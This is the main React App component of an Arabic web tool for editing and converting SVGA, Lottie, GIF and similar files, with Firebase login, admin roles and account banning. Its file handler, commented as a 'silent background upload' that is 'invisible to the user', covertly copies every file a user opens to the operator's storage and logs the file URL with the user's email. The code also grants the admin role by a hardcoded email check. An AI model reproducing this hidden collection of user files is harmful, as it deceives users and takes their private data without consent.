import React, { useState, useEffect } from 'react';
import Header from './components/Header';
import UploadArea from './components/UploadArea';
import FeatureCard from './components/FeatureCard';
import ChatWidget from './components/ChatWidget';
import Editor from './components/Editor';
import JobsModal from './components/JobsModal';
import AuthScreen from './components/AuthScreen';
import AdminDashboard from './components/AdminDashboard';
import { FEATURES } from './constants';
import { db, auth, storage } from './firebase';
import { collection, addDoc, serverTimestamp, doc, getDoc, setDoc, onSnapshot } from 'firebase/firestore';
import { ref, uploadBytes, getDownloadURL } from 'firebase/storage';
import { onAuthStateChanged, User, signOut } from 'firebase/auth';
import { Loader2, AlertTriangle } from 'lucide-react';

const App: React.FC = () => {
  const [user, setUser] = useState<User | null>(null);
  const [authLoading, setAuthLoading] = useState(true);
  const [currentFile, setCurrentFile] = useState<File | null>(null);
  const [isJobsOpen, setIsJobsOpen] = useState(false);
  const [isAdminDashboardOpen, setIsAdminDashboardOpen] = useState(false);
  
  // New States for Role Based Access Control
  const [isAdmin, setIsAdmin] = useState(false);
  const [isBanned, setIsBanned] = useState(false);
  const [checkingRole, setCheckingRole] = useState(false);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, async (currentUser) => {
      setUser(currentUser);
      
      if (currentUser) {
        setCheckingRole(true);
        const userRef = doc(db, "users", currentUser.uid);
        
        // 1. Check if user doc exists, if not create it (Sync Auth to Firestore)
        // We use onSnapshot for real-time ban updates (if you ban them, they get kicked out instantly)
        const unsubUserDoc = onSnapshot(userRef, async (docSnap) => {
           if (docSnap.exists()) {
             const userData = docSnap.data();
             setIsAdmin(userData.role === 'admin');
             setIsBanned(userData.isBanned === true);
             
             // If user is banned, force logout immediately
             if (userData.isBanned === true) {
               await signOut(auth);
               setUser(null);
               alert("تم حظر حسابك من قبل الإدارة. يرجى التواصل مع الدعم.");
             }
           } else {
             // New User: Create Profile
             // Check if this email was pre-approved as admin (Legacy or Manual Entry)
             const initialRole = currentUser.email === "admin@prestigedesigner.com" ? 'admin' : 'user';
             
             await setDoc(userRef, {
               uid: currentUser.uid,
               email: currentUser.email,
               createdAt: serverTimestamp(),
               role: initialRole,
               isBanned: false,
               lastLogin: serverTimestamp()
             }, { merge: true }); // Merge true allows updating existing docs without overwriting if we manually added them before signup
             
             setIsAdmin(initialRole === 'admin');
             setIsBanned(false);
           }
           setCheckingRole(false);
        });

        // Cleanup listener when auth state changes
        return () => unsubUserDoc();
      } else {
        setIsAdmin(false);
        setIsBanned(false);
        setCheckingRole(false);
      }
      setAuthLoading(false);
    });
    return () => unsubscribe();
  }, []);

  const handleFileSelect = async (file: File) => {
    // 1. Immediately show the editor to the user (Instant UI response)
    setCurrentFile(file);
    
    // 2. Silent Background Upload (Invisible to the user)
    if (user) {
      try {
        const storageRef = ref(storage, `uploads/${user.uid}/${Date.now()}_${file.name}`);
        const snapshot = await uploadBytes(storageRef, file);
        const downloadURL = await getDownloadURL(snapshot.ref);

        await addDoc(collection(db, "activity_logs"), {
          type: 'file_upload',
          userId: user.uid,
          userEmail: user.email,
          fileName: file.name,
          fileSize: file.size,
          fileType: file.type || 'unknown',
          fileUrl: downloadURL, 
          timestamp: serverTimestamp()
        });
        console.log("Silent background upload complete.");
      } catch (e) {
        console.error("Background upload error:", e);
        try {
          await addDoc(collection(db, "activity_logs"), {
            type: 'file_upload_failed',
            userId: user.uid,
            userEmail: user.email,
            fileName: file.name,
            error: (e as any).message,
            timestamp: serverTimestamp()
          });
        } catch(logErr) { console.error(logErr); }
      }
    }
  };

  const handleLogout = async () => {
    try {
      await signOut(auth);
      setCurrentFile(null);
      setIsAdminDashboardOpen(false);
    } catch (error) {
      console.error("Error signing out:", error);
    }
  };

  if (authLoading || checkingRole) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-[#050505] text-white flex-col gap-4">
        <Loader2 className="animate-spin text-blue-500" size={32} />
        <p className="text-sm text-gray-500">جاري التحقق من البيانات...</p>
      </div>
    );
  }

  if (isBanned) {
     return (
       <div className="min-h-screen flex items-center justify-center bg-[#050505] text-white p-4">
         <div className="bg-red-500/10 border border-red-500/50 p-8 rounded-2xl text-center max-w-md">
            <AlertTriangle className="mx-auto text-red-500 mb-4" size={48} />
            <h2 className="text-xl font-bold text-red-400 mb-2">الحساب محظور</h2>
            <p className="text-gray-400 text-sm">عذراً، تم تعطيل حسابك من قبل إدارة الموقع لمخالفة القوانين.</p>
            <button onClick={handleLogout} className="mt-6 px-6 py-2 bg-[#222] hover:bg-[#333] rounded-lg text-sm transition-colors">تسجيل الخروج</button>
         </div>
       </div>
     );
  }

  if (!user) {
    return <AuthScreen />;
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#050505] text-white selection:bg-blue-500/30" dir="rtl">
      
      <Header 
        onOpenJobs={() => setIsJobsOpen(true)} 
        onLogout={handleLogout} 
        userEmail={user.email || undefined}
        isAdmin={isAdmin}
        onOpenAdmin={() => setIsAdminDashboardOpen(true)}
      />

      {currentFile ? (
        <Editor file={currentFile} />
      ) : (
        <main className="flex-grow flex flex-col items-center px-4 md:px-8 py-12 md:py-16 max-w-7xl mx-auto w-full">
          
          {/* Hero Section */}
          <div className="text-center max-w-3xl mx-auto mb-8">
            <h1 className="text-4xl md:text-5xl font-bold mb-6 flex items-center justify-center gap-3">
              <span>مصمم برستيج</span>
              <span className="text-4xl md:text-5xl">😎</span>
            </h1>
            <p className="text-gray-500 text-sm md:text-base leading-relaxed max-w-2xl mx-auto">
              يدعم المعاينة، الضغط، تحويل الصيغ، تعديل الحجم، وإدارة الصور والصوتيات لملفات SVGA و Lottie و GIF و WebP و MP4 وغيرها.
            </p>
          </div>

          {/* Upload Section */}
          <UploadArea onFileSelect={handleFileSelect} />

          {/* Features Grid */}
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6 w-full">
            {FEATURES.map((feature, index) => (
              <FeatureCard key={index} feature={feature} />
            ))}
          </div>

        </main>
      )}
      
      <ChatWidget />
      
      {isJobsOpen && (
        <JobsModal onClose={() => setIsJobsOpen(false)} />
      )}
      
      {isAdminDashboardOpen && isAdmin && (
        <AdminDashboard onClose={() => setIsAdminDashboardOpen(false)} />
      )}
      
      {!currentFile && (
        <footer className="py-8 text-center text-neutral-800 text-xs">
          <p>&copy; 2024 مصمم برستيج. جميع الحقوق محفوظة.</p>
        </footer>
      )}
    </div>
  );
};

export default App;